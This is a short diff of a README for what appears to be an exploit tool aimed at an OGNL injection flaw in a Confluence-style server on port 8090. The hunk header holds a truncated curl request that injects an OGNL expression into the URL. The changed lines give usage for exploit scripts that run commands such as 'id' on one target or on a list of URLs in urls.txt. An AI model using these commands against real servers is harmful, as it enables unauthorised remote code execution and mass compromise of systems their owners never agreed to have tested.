@@ -19,14 +19,14 @@ curl -v http://target_IP:8090/${Class.forName("com.opensymphony.webwork.ServletA
 
 Exploit single target
 ```
-python3 scanner.py -u http://xxxxx.com -c id
-```
-```
 python3 exploit.py https://target.com CMD
+```
+```
+python3 exploit2.py -u http://xxxxx.com -c id
 ```
 Exploit multi-targets
 ```
-python3 scanner.py -f urls.txt -p -c id
+python3 exploit2.py -f urls.txt -p -c id
 ```
 <!--
 ```
